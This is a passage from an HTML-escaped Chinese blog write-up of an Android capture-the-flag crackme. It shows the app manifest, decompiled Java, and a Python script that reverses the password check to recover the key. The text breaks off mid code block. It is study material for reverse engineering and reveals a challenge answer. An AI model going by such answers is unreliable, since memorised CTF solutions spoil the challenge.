class=&#34;string&#34;&gt;&amp;quot;com.example.test.ctf02&amp;quot;&lt;/span&gt; platformBuildVersionCode=&lt;span class=&#34;string&#34;&gt;&amp;quot;24&amp;quot;&lt;/span&gt; platformBuildVersionName=&lt;span class=&#34;string&#34;&gt;&amp;quot;7.0&amp;quot;&lt;/span&gt; xmlns:android=&lt;span class=&#34;string&#34;&gt;&amp;quot;http://schemas.android.com/apk/res/android&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;uses-sdk android:minSdkVersion=&lt;span class=&#34;string&#34;&gt;&amp;quot;14&amp;quot;&lt;/span&gt; android:targetSdkVersion=&lt;span class=&#34;string&#34;&gt;&amp;quot;24&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;application android:allowBackup=&lt;span class=&#34;string&#34;&gt;&amp;quot;true&amp;quot;&lt;/span&gt; android:debuggable=&lt;span class=&#34;string&#34;&gt;&amp;quot;true&amp;quot;&lt;/span&gt; android:icon=&lt;span class=&#34;string&#34;&gt;&amp;quot;@mipmap/ic_launcher&amp;quot;&lt;/span&gt; android:label=&lt;span class=&#34;string&#34;&gt;&amp;quot;@string/app_name&amp;quot;&lt;/span&gt; android:supportsRtl=&lt;span class=&#34;string&#34;&gt;&amp;quot;true&amp;quot;&lt;/span&gt; android:theme=&lt;span class=&#34;string&#34;&gt;&amp;quot;@style/AppTheme&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;activity android:name=&lt;span class=&#34;string&#34;&gt;&amp;quot;com.example.test.ctf02.MainActivity&amp;quot;&lt;/span&gt;&amp;gt;&lt;span class=&#34;comment&#34;&gt;//第一个调用的activity&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;lt;intent-filter&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;action android:name=&lt;span class=&#34;string&#34;&gt;&amp;quot;android.intent.action.MAIN&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;category android:name=&lt;span class=&#34;string&#34;&gt;&amp;quot;android.intent.category.LAUNCHER&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;lt;/intent-filter&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/activity&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;receiver android:enabled=&lt;span class=&#34;string&#34;&gt;&amp;quot;true&amp;quot;&lt;/span&gt; android:exported=&lt;span class=&#34;string&#34;&gt;&amp;quot;true&amp;quot;&lt;/span&gt; android:name=&lt;span class=&#34;string&#34;&gt;&amp;quot;com.example.test.ctf02.GetAndChange&amp;quot;&lt;/span&gt;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;//允许广播————这个activity允许外部调用,广播接收器的名字是com.example.test.ctf02.GetAndChange&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;lt;intent-filter&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;action android:name=&lt;span class=&#34;string&#34;&gt;&amp;quot;android.is.very.fun&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;lt;/intent-filter&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/receiver&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;activity android:name=&lt;span class=&#34;string&#34;&gt;&amp;quot;com.example.test.ctf02.NextContent&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;activity android:name=&lt;span class=&#34;string&#34;&gt;&amp;quot;com.example.test.ctf02.MainActivity2&amp;quot;&lt;/span&gt; /&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;lt;/application&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/manifest&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;我们直接看入口点的位置&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#我们直接看入口点的位置&#34;&gt;#&lt;/a&gt; 我们直接看入口点的位置&lt;/h3&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//...&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;MainActivity&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;extends&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;AppCompatActivity&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; Button login;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;private&lt;/span&gt; EditText passWord;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;MainActivity&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;super&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;static&lt;/span&gt; EditText access$&lt;span class=&#34;number&#34;&gt;000&lt;/span&gt;(MainActivity arg1) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; arg1.passWord;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;onCreate&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(Bundle arg3)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;super&lt;/span&gt;.onCreate(arg3);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.setContentView(&lt;span class=&#34;number&#34;&gt;0x7F04001A&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.passWord = &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.findViewById(&lt;span class=&#34;number&#34;&gt;0x7F0B0055&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.login = &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.findViewById(&lt;span class=&#34;number&#34;&gt;0x7F0B0056&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.login.setOnClickListener(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;View$OnClickListener&lt;/span&gt;() &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;onClick&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(View arg7)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Check&lt;/span&gt;().checkPassword(MainActivity.&lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.passWord.getText().toString())) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;comment&#34;&gt;//我们关注的是这个check类的检查方式&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    Toast.makeText(MainActivity.&lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;Good,Please go on!&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;).show();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    MainActivity.&lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.startActivity(&lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Intent&lt;/span&gt;(MainActivity.&lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;, MainActivity2.class));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    MainActivity.&lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;.finish();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    Toast.makeText(MainActivity.&lt;span class=&#34;built_in&#34;&gt;this&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;Failed&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;).show();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;check类的定义&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#check类的定义&#34;&gt;#&lt;/a&gt; check 类的定义&lt;/h3&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;package&lt;/span&gt; com.example.test.ctf02;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Check&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;Check&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;super&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;boolean&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;checkPassword&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(String arg7)&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;v5&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;boolean&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;v2&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;[] v1 = arg7.toCharArray();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(v1.length == v5) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;v0&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(&lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(v0 &amp;lt; v1.length) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    v1[v0] = ((&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt;)(&lt;span class=&#34;number&#34;&gt;0xFF&lt;/span&gt; - v0 - &lt;span class=&#34;number&#34;&gt;100&lt;/span&gt; - v1[v0]));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(v1[v0] == &lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt; &amp;amp;&amp;amp; v0 &amp;lt; v5) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        ++v0;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                        &lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                    &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; v2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            v2 = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; v2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;首先长度限制为 12，然后将我们输入的字符串转为字符数组，根据代码我们写出逆向解析&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ss = []&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#0xff-i-100-ord(ss[i])==0x30&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ss.append(&lt;span class=&#34;built_in&#34;&gt;chr&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0xff&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;100&lt;/span&gt;-i))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;key = &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; ss:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	key+=i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(key)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#结果为：   “kjihgfedcba`”&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;mainactivity2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#mainactivity2&#34;&gt;#&lt;/a&gt; MainActivity2&lt;/h2&gt;
&lt;p&gt;这里完成之后，MainActivity 会调用 MainActivity2。但是在 Manifest 中没有对其进行声明（这回有什么影响吗？）但是 app 貌似已经进入了。&lt;/p&gt;
&lt;p&gt;接着就是对图片的处理，要求我们输入现实吗，但是显示码在哪里？&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;E:%5CmyBLOG%5Cblog%5Csource_posts%5Cadworld-%E5%9F%BA%E7%A1%80%E7%9A%84android%5Cimage-20220718122215383.png&#34; alt=&#34;image-20220718122215383&#34;&gt;&lt;/p&gt;
&lt;p&gt;这里就引用了 MainActivity2 的部分，&lt;/p&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span 